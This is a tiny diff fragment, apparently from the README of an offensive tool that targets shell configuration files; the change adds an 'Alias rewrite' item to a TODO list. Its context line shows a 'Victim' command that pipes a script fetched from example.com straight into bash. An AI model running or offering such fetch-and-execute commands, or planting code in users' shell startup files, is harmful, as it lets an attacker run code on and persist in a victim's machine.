@@ -32,3 +32,4 @@ Victim   : curl http://example.com/chocolatine.sh|bash
 
 ## TODO
  - :x: Fish Shell (~/.config/fish/config.fish)
+ - :x: Alias rewrite
